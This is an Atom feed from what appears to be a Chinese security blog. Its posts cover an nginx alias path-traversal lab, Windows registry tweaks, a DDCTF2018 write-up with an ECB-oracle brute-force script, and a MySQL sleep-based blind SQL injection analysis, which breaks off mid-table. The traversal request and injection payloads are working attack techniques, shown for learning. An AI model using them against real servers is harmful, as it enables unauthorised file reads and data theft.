<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BlackWolfsec</title>
  
  <subtitle>silence &amp; hear</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blackwolfsec.cc/"/>
  <updated>2018-05-23T12:26:03.962Z</updated>
  <id>http://blackwolfsec.cc/</id>
  
  <author>
    <name>邮箱地址：admin@blackwolfsec.cc</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Nginx错误配置alias导致目录遍历漏洞</title>
    <link href="http://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/"/>
    <id>http://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/</id>
    <published>2018-05-22T16:00:00.000Z</published>
    <updated>2018-05-23T12:26:03.962Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>nginx错误配置alias，导致存在目录遍历，可跳出限制读取上一层目录及其任意子目录的文件的任意文件。<br><a id="more"></a></p><h3 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h3><ul><li><p>使用richarvey/nginx-php-fpm镜像</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -p 80:80  richarvey/nginx-php-fpm</span></span><br></pre></td></tr></table></figure></li><li><p>配置nginx，添加配置test路由解析到<code>/var/www/html/</code>路径（注意：/test没有结尾的<code>/</code>）</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/nginx/sites-available/default.conf</span></span><br><span class="line"><span class="keyword">location</span> <span class="title">/test</span> &#123;</span><br><span class="line">        alias /var/www/html/;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>对应Web服务的文件结构，目标是目录遍历获取flag.txt的内容</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">|--var</span></span><br><span class="line">   <span class="string">|--www</span></span><br><span class="line">      <span class="string">|--flag.txt</span></span><br><span class="line">      <span class="string">|--html</span></span><br><span class="line">         <span class="string">|--index.php</span></span><br><span class="line">         <span class="string">|--test.txt</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><ul><li><p>通过访问<a href="http://127.0.0.1/test/test.txt" target="_blank" rel="noopener">http://127.0.0.1/test/test.txt</a><br>可以成功访问到test的内容如下(<code>/test/test.txt</code>路由请求，经处理后转换成：<code>/var/www/html/test.txt</code>)：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span> <span class="keyword">is</span> a test</span><br></pre></td></tr></table></figure></li><li><p>修改请求为<a href="http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`)" target="_blank" rel="noopener">http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`)</a></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you <span class="keyword">get</span> <span class="keyword">me</span>, hahaha</span><br></pre></td></tr></table></figure></li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h3><ul><li>只能跳到上一层目录，读取上一层目录及其任意子目录的文件，不能任意目录遍历读取任意文件,有局限性。</li><li>需要nginx配置缺陷，实战情况比较有限，但是真实存在（如：参考链接3）。</li><li>一种场景是：很多网站会把备份文件放置在网页目录的上一层路径下，利用遍历读取备份文件；另一种场景是：路由限制到上传或静态图片路径，利用遍历读取上一层路径下的配置文件等。<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3></li><li><a href="https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md" target="_blank" rel="noopener">https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md</a></li><li><a href="https://hackerone.com/reports/317201" target="_blank" rel="noopener">https://hackerone.com/reports/317201</a></li><li><a href="https://hackerone.com/reports/312510" target="_blank" rel="noopener">https://hackerone.com/reports/312510</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;nginx错误配置alias，导致存在目录遍历，可跳出限制读取上一层目录及其任意子目录的文件的任意文件。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://blackwolfsec.cc/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
      <category term="Nginx" scheme="http://blackwolfsec.cc/tags/Nginx/"/>
    
      <category term="目录遍历" scheme="http://blackwolfsec.cc/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
    
  </entry>
  
  <entry>
    <title>Win10下常用的修改注册表Tips</title>
    <link href="http://blackwolfsec.cc/2018/05/07/win10_reg_cmd_bash_ipsec/"/>
    <id>http://blackwolfsec.cc/2018/05/07/win10_reg_cmd_bash_ipsec/</id>
    <published>2018-05-06T16:00:00.000Z</published>
    <updated>2018-05-07T09:00:43.303Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><ol><li>Win10快速右键添加“在此处打开CMD”以及安装了ubuntu子系统或者Kali子系统的情况下，右键添加“在此处打开Bash”</li><li>解决Win10连接IPsec VPN报错问题。<a id="more"></a></li></ol><h3 id="0x01-Win10右键添加“在此处打开CMD”"><a href="#0x01-Win10右键添加“在此处打开CMD”" class="headerlink" title="0x01 Win10右键添加“在此处打开CMD”"></a>0x01 Win10右键添加“在此处打开CMD”</h3><p>保存以下代码为<a href="http://www.blackwolfsec.cc/static/code/cmd.reg" target="_blank" rel="noopener">cmd.reg</a>,然后点击运行即可<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\<span class="keyword">shell</span><span class="bash">\open_cmd]</span></span><br><span class="line"><span class="bash">@=<span class="string">"Open CMD Here"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\shell\open_cmd\<span class="built_in">command</span>]</span></span><br><span class="line"><span class="bash">@=<span class="string">"cmd.exe /s /k pushd \"%V\""</span></span></span><br><span class="line"><span class="bash">[-HKEY_CLASSES_ROOT\Directory\Background\shell\open_cmd]</span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\Background\shell\open_cmd]</span></span><br><span class="line"><span class="bash">@=<span class="string">"在此处打开CMD窗口"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash"><span class="string">"Icon"</span>=<span class="string">"cmd.exe"</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\Background\shell\open_cmd\<span class="built_in">command</span>]</span></span><br><span class="line"><span class="bash">@=<span class="string">"cmd.exe /s /k pushd \"%V\""</span></span></span><br><span class="line"><span class="bash">[-HKEY_CLASSES_ROOT\Drive\shell\open_cmd]</span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Drive\shell\open_cmd]</span></span><br><span class="line"><span class="bash">@=<span class="string">"Open CMD Here"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Drive\shell\open_cmd\<span class="built_in">command</span>]</span></span><br></pre></td></tr></table></figure></p><h3 id="0x02-Win10右键添加“在此处打开Bash”"><a href="#0x02-Win10右键添加“在此处打开Bash”" class="headerlink" title="0x02 Win10右键添加“在此处打开Bash”"></a>0x02 Win10右键添加“在此处打开Bash”</h3><p><em>ps:前提是安装了Win10的ubuntu子系统或者Kali子系统</em></p><p>保存以下代码为<a href="http://www.blackwolfsec.cc/static/code/bash.reg" target="_blank" rel="noopener">bash.reg</a>,然后点击运行即可<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\<span class="keyword">shell</span><span class="bash">\open_bash]</span></span><br><span class="line"><span class="bash">@=<span class="string">"Open Bash Here"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\shell\open_bash\<span class="built_in">command</span>]</span></span><br><span class="line"><span class="bash">@=<span class="string">"bash.exe"</span></span></span><br><span class="line"><span class="bash">[-HKEY_CLASSES_ROOT\Directory\Background\shell\open_bash]</span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\Background\shell\open_bash]</span></span><br><span class="line"><span class="bash">@=<span class="string">"在此处打开Bash窗口"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash"><span class="string">"Icon"</span>=<span class="string">"bash.exe"</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Directory\Background\shell\open_bash\<span class="built_in">command</span>]</span></span><br><span class="line"><span class="bash">@=<span class="string">"bash.exe"</span></span></span><br><span class="line"><span class="bash">[-HKEY_CLASSES_ROOT\Drive\shell\open_bash]</span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Drive\shell\open_bash]</span></span><br><span class="line"><span class="bash">@=<span class="string">"Open Bash Here"</span></span></span><br><span class="line"><span class="bash"><span class="string">"HasLUAShield"</span>=<span class="string">""</span></span></span><br><span class="line"><span class="bash">[HKEY_CLASSES_ROOT\Drive\shell\open_bash\<span class="built_in">command</span>]</span></span><br></pre></td></tr></table></figure></p><h3 id="0x03-Win10解决IPsecVPN连接报错问题"><a href="#0x03-Win10解决IPsecVPN连接报错问题" class="headerlink" title="0x03 Win10解决IPsecVPN连接报错问题"></a>0x03 Win10解决IPsecVPN连接报错问题</h3><p>ps:适用于：Windows Vista, 7, 8, 10, and 2008 Server:<br><strong>报错信息</strong>：</p><p><em>无法建立计算机与 VPN服务器之间的网络连接，因为远程服务器未响应。这可能是因为未将计算机与远程服务器之间的某种网络设备(如防火墙、NAT、路由器等)配置为容许 VPN 连接。请与管理员或服务供给商联系以确定哪种设备可能产生此问题</em></p><p><strong>解决办法</strong>：<br>保存如下代码为<a href="http://www.blackwolfsec.cc/static/code/ipsec.reg" target="_blank" rel="noopener">ipsec.reg</a>，然后双击运行即可<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00   </span><br><span class="line">[HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\S</span>ervices<span class="symbol">\P</span>olicyAgent]   </span><br><span class="line">"AssumeUDPEncapsulationContextOnSendRule"=dword:00000002</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Win10快速右键添加“在此处打开CMD”以及安装了ubuntu子系统或者Kali子系统的情况下，右键添加“在此处打开Bash”&lt;/li&gt;
&lt;li&gt;解决Win10连接IPsec VPN报错问题。
    
    </summary>
    
      <category term="技术研究" scheme="http://blackwolfsec.cc/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Windows" scheme="http://blackwolfsec.cc/tags/Windows/"/>
    
      <category term="VPN" scheme="http://blackwolfsec.cc/tags/VPN/"/>
    
      <category term="IPsec" scheme="http://blackwolfsec.cc/tags/IPsec/"/>
    
      <category term="CMD" scheme="http://blackwolfsec.cc/tags/CMD/"/>
    
      <category term="Bash" scheme="http://blackwolfsec.cc/tags/Bash/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2018 部分WriteUP</title>
    <link href="http://blackwolfsec.cc/2018/04/20/DDCTF2018/"/>
    <id>http://blackwolfsec.cc/2018/04/20/DDCTF2018/</id>
    <published>2018-04-19T16:00:00.000Z</published>
    <updated>2018-04-20T11:48:00.183Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近参加DDCTF2018，记录其中两个题的WriteUp<br><a id="more"></a></p><h3 id="1-第四扩展FS"><a href="#1-第四扩展FS" class="headerlink" title="1. 第四扩展FS"></a>1. 第四扩展FS</h3><p>题目给了一张图片，用foremost提取出一张图片和加密的zip压缩包，爆破解压密码许久都没有成功，用EmEditor打开看到有字符串：Pactera，成功解压压缩包，然后根据提示需要统计字符出现次数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">f=open(<span class="string">"file.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line">print(Counter(f.readlines()[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line">Counter(&#123;<span class="string">'D'</span>: <span class="number">3950</span>, <span class="string">'C'</span>: <span class="number">1900</span>, <span class="string">'T'</span>: <span class="number">1850</span>, <span class="string">'F'</span>: <span class="number">1800</span>, <span class="string">'&#123;'</span>: <span class="number">1750</span>, <span class="string">'h'</span>: <span class="number">1700</span>, <span class="string">'u'</span>: <span class="number">1650</span>, <span class="string">'a'</span>: <span class="number">1600</span>, <span class="string">'n'</span>: <span class="number">1550</span>, <span class="string">'w'</span>: <span class="number">1500</span>, <span class="string">'e'</span>: <span class="number">1450</span>, <span class="string">'1'</span>: <span class="number">1400</span>, <span class="string">'s'</span>: <span class="number">1350</span>, <span class="string">'i'</span>: <span class="number">1300</span>, <span class="string">'k'</span>: <span class="number">1250</span>, <span class="string">'4'</span>: <span class="number">1200</span>, <span class="string">'o'</span>: <span class="number">1150</span>, <span class="string">'!'</span>: <span class="number">1100</span>, <span class="string">'&#125;'</span>: <span class="number">1050</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>得到flag:DDCTF{huanwe1sik4o!}</p><h3 id="2-安全通信"><a href="#2-安全通信" class="headerlink" title="2. 安全通信"></a>2. 安全通信</h3><p>该题使用ECB(电子密码本模式)进行加密，由于分组模式中ECB模式相同的明文分组，会得到相同密文输出。</p><p>根据这个特性，以爆破第一位为例，构造输入Agent ID 为45个1，加密消息为：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection <span class="keyword">for</span> mission: ID为<span class="number">111111111111111111111111111111111111111111111</span>, your mission<span class="symbol">'s</span> flag <span class="keyword">is</span>: D</span><br></pre></td></tr></table></figure></p><p>然后加上Flag的第一位，构成96（16*6）个字符长度输入，截取密文的前192（32*6）。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Please enter mission key:</span><br><span class="line">b9ba15b341c847c8beba85273f9b7f90</span><br><span class="line"><span class="comment">#Agent ID为45个1</span></span><br><span class="line">Please enter your Agent ID <span class="keyword">to</span> secure communications:</span><br><span class="line"><span class="comment">#返回的欢迎加密信息，取前192位作为判断</span></span><br><span class="line"><span class="number">111111111111111111111111111111111111111111111</span></span><br><span class="line">ce62ff6f5ebd23a8d059b1bd831a8d0fed6d82e4257f35a62ef76a43970ade3e06b6e8e7589fddd8b8ac55e5c29625e906b6e8e7589fddd8b8ac55e5c29625e9eae01a76a2f84e768e4408555cb4acbf17888d387e8b7756e9a3de2a68b4fbf726b43ef60ec00ce6bfbdf91d4d9dba79bb2983e79315def49a0fa8eaa10cd4a8250e53382d70f71936a32961d5741662</span><br><span class="line"></span><br><span class="line">Please send <span class="keyword">some</span> messages <span class="keyword">to</span> be encrypted, 'quit' <span class="keyword">to</span> <span class="keyword">exit</span>:</span><br><span class="line"><span class="comment">#猜测第一位为C</span></span><br><span class="line">Connection <span class="keyword">for</span> mission: <span class="number">111111111111111111111111111111111111111111111</span>, your mission's flag <span class="keyword">is</span>: C</span><br><span class="line">ce62ff6f5ebd23a8d059b1bd831a8d0fed6d82e4257f35a62ef76a43970ade3e06b6e8e7589fddd8b8ac55e5c29625e906b6e8e7589fddd8b8ac55e5c29625e9eae01a76a2f84e768e4408555cb4acbf18c2aed45181d467f22c858da3d1b03b</span><br><span class="line">Please send <span class="keyword">some</span> messages <span class="keyword">to</span> be encrypted, 'quit' <span class="keyword">to</span> <span class="keyword">exit</span>:</span><br><span class="line"><span class="comment">#猜测第一位为D</span></span><br><span class="line">Connection <span class="keyword">for</span> mission: <span class="number">111111111111111111111111111111111111111111111</span>, your mission's flag <span class="keyword">is</span>: D</span><br><span class="line">ce62ff6f5ebd23a8d059b1bd831a8d0fed6d82e4257f35a62ef76a43970ade3e06b6e8e7589fddd8b8ac55e5c29625e906b6e8e7589fddd8b8ac55e5c29625e9eae01a76a2f84e768e4408555cb4acbf17888d387e8b7756e9a3de2a68b4fbf7</span><br><span class="line">Please send <span class="keyword">some</span> messages <span class="keyword">to</span> be encrypted, 'quit' <span class="keyword">to</span> <span class="keyword">exit</span>:</span><br></pre></td></tr></table></figure></p><p>当输入的最后一位为D时，加密结果和欢迎消息密文的前192位结果相同。接下来爆破Flag的第二位时，将Agent ID位数减1（44位）。依次递增Flag位数，同时递减Agent ID位数即可爆破出Flag，写个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Connection for mission: 111111111111111111111111111111111111111111111, your mission's flag is: D</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">mission_key=<span class="string">"b9ba15b341c847c8beba85273f9b7f90"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">payloads = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz.@_-&#125;&#123;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    r = remote(<span class="string">'116.85.48.103'</span>, <span class="number">5002</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Please enter mission key:"</span>)</span><br><span class="line">    r.sendline(mission_key)</span><br><span class="line">    mission_len=<span class="number">45</span>-i</span><br><span class="line">    r.recvuntil(<span class="string">"Please enter your Agent ID to secure communications:"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>*mission_len)</span><br><span class="line">    data_1=r.recvuntil(<span class="string">"Please send some messages to be encrypted, 'quit' to exit:"</span>).strip()[:<span class="number">192</span>]</span><br><span class="line">    <span class="comment">#print data_1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">    name=<span class="string">"1"</span>*mission_len</span><br><span class="line">    flag_buf=flag+j</span><br><span class="line">    message = <span class="string">"Connection for mission: &#123;&#125;, your mission's flag is: &#123;&#125;"</span>.format(name, flag_buf)</span><br><span class="line">    <span class="comment">#print message</span></span><br><span class="line">    r.sendline(message)</span><br><span class="line">        data_2=r.recvuntil(<span class="string">"Please send some messages to be encrypted, 'quit' to exit:"</span>).strip()[:<span class="number">192</span>]</span><br><span class="line">        <span class="comment">#print data_2</span></span><br><span class="line">        <span class="keyword">if</span> data_1==data_2:</span><br><span class="line">        flag=flag+j</span><br><span class="line">        <span class="keyword">print</span> flag</span><br><span class="line">        r.sendline(<span class="string">"quit"</span>)</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'&#125;'</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">……</span><br><span class="line">DDCTF&#123;afd18f4a112ca67951fc95afb92b7</span><br><span class="line">DDCTF&#123;afd18f4a112ca67951fc95afb92b74</span><br><span class="line">DDCTF&#123;afd18f4a112ca67951fc95afb92b74d8</span><br><span class="line">DDCTF&#123;afd18f4a112ca67951fc95afb92b74d8&#125;</span><br></pre></td></tr></table></figure><p>得到Flag；DDCTF{afd18f4a112ca67951fc95afb92b74d8}</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近参加DDCTF2018，记录其中两个题的WriteUp&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://blackwolfsec.cc/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blackwolfsec.cc/tags/CTF/"/>
    
      <category term="WriteUP" scheme="http://blackwolfsec.cc/tags/WriteUP/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 执行优先级和sleep函数延时注入的一个Tip</title>
    <link href="http://blackwolfsec.cc/2018/03/13/Mysql_sleep/"/>
    <id>http://blackwolfsec.cc/2018/03/13/Mysql_sleep/</id>
    <published>2018-03-13T03:51:20.000Z</published>
    <updated>2018-03-13T03:55:25.389Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>代码审计发现了一个基于时间延迟的SQL盲注，但是发现 sleep(2)成功获取数据时页面返回时间均为4秒，即为设置时间的两倍，所以有了下面的分析。<br><a id="more"></a></p><h2 id="0x01Mysql-执行优先级和sleep函数"><a href="#0x01Mysql-执行优先级和sleep函数" class="headerlink" title="0x01Mysql 执行优先级和sleep函数"></a>0x01Mysql 执行优先级和sleep函数</h2><p>Mysql语句关于AND和OR执行优先级和Mysql查询优化策略有以下几点：</p><ul><li>AND的优先级大于OR，先计算AND的结果，再计算or的结果</li><li>同优先级AND中如果有恒为0(如and 1=2),则直接返回0，不执行同级中的其他语句</li><li>多个OR连接的语句中如果有恒为1(如or 1=1),则直接返回1，不执行的其他语句</li></ul><ol start="0"><li><p>首先测试数据表结构和数据如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf;</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|   1002 | test2    | test2     | 1    |</span><br><span class="line">|   1001 | test1    | test1     | 1    |</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行select * from ctf where mood=sleep(1)，延时了3秒。<br>（没有限定条件，和数据表的每一条进行对比，进行了3次sleep(1)函数）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf where mood=sleep(1) ;</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">1 row in set (3.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行select * from ctf where username=’test2’ and mood=sleep(1);延时1秒。<br>（先筛选username=’test2’，只有1条记录，进行了1次sleep(1)函数）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> ctf where <span class="attribute">username</span>=<span class="string">'test2'</span> <span class="keyword">and</span> <span class="attribute">mood</span>=sleep(1);</span><br><span class="line">Empty <span class="builtin-name">set</span> (1.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行 select * from ctf where userid&gt;100 and mood=sleep(1);延时2秒。<br>（先筛选userid&gt;100，有2条记录，进行了2次sleep(1)函数）</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> ctf <span class="keyword">where</span> userid&gt;<span class="number">100</span> <span class="keyword">and</span> mood=sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">2.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>select * from ctf where userid&gt;100 and 1=2 and mood=sleep(1);没有延时直接返回空。（由于sleep之前有and 1=2,不可能成立，直接返回空，没有执行sleep(1)）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> ctf where userid&gt;100 <span class="keyword">and</span> <span class="attribute">1</span>=2 <span class="keyword">and</span> <span class="attribute">mood</span>=sleep(1);</span><br><span class="line">Empty <span class="builtin-name">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行select * from ctf where userid&gt;100 and 1=2 or mood=sleep(1);延时3秒<br>（根据优先级，先计算执行100 and 1=2,不可能成立，没有符合要求的数据记录，但是还需要判断or之后的条件，所以仍然要查询比对三次，执行3次sleep(1)）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf where userid&gt;100 and 1=2 or mood=sleep(1);</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|    100 | 32313333 | test      | 